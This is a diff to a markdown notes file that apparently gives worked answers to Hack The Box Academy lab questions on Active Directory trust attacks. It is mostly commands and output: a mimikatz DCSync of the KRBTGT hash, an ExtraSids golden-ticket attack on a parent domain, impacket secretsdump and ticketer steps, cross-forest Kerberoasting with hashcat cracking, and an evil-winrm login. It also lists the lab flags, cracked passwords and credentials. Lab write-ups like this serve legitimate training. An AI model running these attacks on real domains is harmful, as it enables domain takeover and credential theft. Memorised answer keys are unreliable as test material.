@@ -3844,6 +3844,221 @@ Results: Pass@word
 
 ### Why So Trusting?
 
+**RDP to  with user "htb-student" and password "Academy_student_AD!". What is the child domain of INLANEFREIGHT.LOCAL? (format: FQDN, i.e., DEV.ACME.LOCAL)**
+
+```powershell
+Import-Module activedirectory
+Get-ADTrust -Filter *
+```
+
+Results: LOGISTICS.INLANEFREIGHT.LOCAL,
+
+**What domain does the INLANEFREIGHT.LOCAL domain have a forest transitive trust with?**
+
+```powershell
+# Same as above
+Import-Module activedirectory
+Get-ADTrust -Filter *
+```
+
+Results: FREIGHTLOGISTICS.LOCAL
+
+**What direction is this trust?**
+
+Results: Bidirectional
+
+
+**RDP to  with user "htb-student_adm" and password "HTB_@cademy_stdnt_admin!". What is the SID of the child domain?**
+
+```powershell
+# As we are already in the child domain:
+Import-Module .\PowerView.ps1
+Get-DomainSID
+```
+
+Results: S-1-5-21-2806153819-209893948-922872689
+
+
+ **What is the SID of the Enterprise Admins group in the root domain?**
+
+```powershell
+Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
+
+```
+
+Results: S-1-5-21-3842939050-3880317879-2865463114-519
+
+
+**Perform the ExtraSids attack to compromise the parent domain. Submit the contents of the flag.txt file located in the c:\ExtraSids folder on the ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL domain controller in the parent domain.**
+
+```
+# The complete attack would require getting the golden tickets.
+# Step 1: get SID of the Child domain
+Import-Module .\PowerView.ps1
+Get-DomainSID
+# Result: S-1-5-21-2806153819-209893948-922872689
+
+
+# Step 2: get  KRBTGT hash for the child domain
+# Go to mimikatz.exe file in the explorer and execute as admin
+lsadump::dcsync /user:$domain\$user
+# Result:  `9d765b482771505cbe97411065964d5f`.
+
+# Step 3: getting the name of a target user in the child domain (does not need to exist!)
+# Result: hacker
+
+# Step 4: getting the FQDN of the child domain. 
+# Listed above in mimikatz output
+# Result:  `LOGISTICS.INLANEFREIGHT.LOCAL`
+
+# Step 5: getting the SID of the Enterprise Admins group of the root domain
+# Way #1:
+Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
+# Way #2:
+Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL"
+# Result:  `S-1-5-21-3842939050-3880317879-2865463114-519`
+
+# Step 6: the attack
+# Generate a golden ticket:
+kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
+# Read the flag (make sure that the ticket has been created with klist)
+cat \\academy-ea-dc01.inlanefreight.local\c$\ExtraSids\flag.txt
+```
+
+Results: f@ll1ng_l1k3_d0m1no3$
+
+
+**SSH to with user "htb-student" and password "HTB_@cademy_stdnt!". Perform the ExtraSids attack to compromise the parent domain from the Linux attack host. After compromising the parent domain obtain the NTLM hash for the Domain Admin user bross. Submit this hash as your answer.**
+
+```
+#### Step 1: getting the KRBTGT hash for the child domain
+secretsdump.py $targetedDomain/$UserWithAdminPriv@$TargetedIP -just-dc-user $NetbiosNameofDomain/krbtgt
+
+# Example:
+# secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
+# Enter password: HTB_@cademy_stdnt_admin!
+# Results: 9d765b482771505cbe97411065964d5f
+#### 
+
+#### Step 2: getting the SID for the child domain. Obtain the SID for the domain and the RIDs for each user and group and filter out by Domain SID
+lookupsid.py $targetedDomain/$UserWithAdminPriv@TargetedIP | grep "Domain SID"
+
+# Example:
+# lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
+# Enter password: HTB_@cademy_stdnt_admin!
+# Results:  S-1-5-21-2806153819-209893948-922872689
+####
+
+#### Step 3: getting the name of a target user in the child domain (does not need to exist!)
+hacker
+####
+
+#### Step 4: getting the FQDN of the child domain.
+logistics.inlanefreight.local
+####
+
+#### Step 5: getting the SID of the Enterprise Admins group of the root domain
+lookupsid.py $targetedDomain/$UserWithAdminPriv@$DomainControllerIP | grep "Enterprise Admins"
+# Example:
+# lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep "Enterprise Admins"
+# Enter password: HTB_@cademy_stdnt_admin!
+# Results: 519: INLANEFREIGHT\Enterprise Admins (SidTypeGroup)
+####
+
+#### Step 6: Generate a golden ticket 
+ticketer.py -nthash $KRBTGThashOfChildDomain -domain $targetedDomain -domain-sid $sidDomain -extra-sid $SIDofEnterpriseAdminGroup $madeupUserName
+# Example:
+# ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
+
+# The ticket will be saved down to our system as a credential cache (ccache) file, which is a file used to hold Kerberos credentials:
+[*] Saving ticket in hacker.ccache
+
+# Setting the KRB5CCNAME environment variable tells the system to use this file for Kerberos authentication attempts.
+export KRB5CCNAME=hacker.ccache 
+####
+
+#### Step 7: Accessing another user on domain
+# With one user, we will request the NTLM hash for another user
+secretsdump.py $ControlledUsername@$hostnameController.$Parentdomain -k -no-pass -just-dc-ntlm -just-dc-user $targetUsername
+# Example:
+# secretsdump.py hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -just-dc-ntlm -just-dc-user bross
+
+```
+
+Results: 49a074a39dd0651f647e765c2cc794c7
+
+### Breaking Down Boundaries
+
+
+**Perform a cross-forest Kerberoast attack and obtain the TGS for the mssqlsvc user. Crack the ticket and submit the account's cleartext password as your answer.**
+
+```
+#### Enumerating SPNs
+Get-DomainUser -SPN -Domain $TargetDomain | select SamAccountName
+# Example:
+# Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
+# Results: mssqlsvc
+######
+
+#### Getting which groups is mssqlsvc member of
+Get-DomainUser -Domain $TargetDomain -Identity $interestingUserSamAccountName | select samaccountname,memberof
+# Example:
+# Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | select samaccountname,memberof
+# Results:  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
+######
+
+#### Performing a Kerberoasting Attacking with Rubeus Using /domain Flag
+.\Rubeus.exe kerberoast /domain:$TargetDomain /user:$interestingUserSamAccountName /nowrap
+# Example: 
+# .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
+# Results: [the kerberos ticket]
+####
+
+#### Crack it
+hashcat -m 13100 ticketTocrack /usr/share/wordlists/rockyou.txt 
+```
+
+Results: 1logistics
+
+
+**Kerberoast across the forest trust from the Linux attack host. Submit the name of another account with an SPN aside from MSSQLsvc.**
+
+```
+GetUserSPNs.py -target-domain $targetedDomain $OurDomain/$ourUserSamAccountName
+# Example:
+# GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
+# Enter password: transporter@4
+```
+
+Results: sapsso
+
+
+**Crack the TGS and submit the cleartext password as your answer.**
+
+```
+GetUserSPNs.py -request -target-domain $targetedDomain $OurDomain/$ourUserSamAccountName
+# Example:
+# GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
+# Enter password: transporter@4
+
+# Cracking the sapsso TGS:
+hashcat -m 13100 sapsso /usr/share/wordlists/rockyou.txt  
+```
+
+Results: pabloPICASSO
+
+
+
+**Log in to the ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL Domain Controller using the Domain Admin account password submitted for question #2 and submit the contents of the flag.txt file on the Administrator desktop.**
+
+```
+evil-winrm -i 172.16.5.238 -u sapsso -p pabloPICASSO
+cat c:\Users\Administrator\Desktop\flag.txt
+```
+
+Results: burn1ng_d0wn_th3_f0rest!
+
+
 Question
 
 ```
@@ -3851,17 +4066,6 @@ Question
 ```
 
 Results:
-
-
-
-Question
-
-```
-
-```
-
-Results:
-
 
 
 ## [Using Web Proxies](https://academy.hackthebox.com/module/details/110)
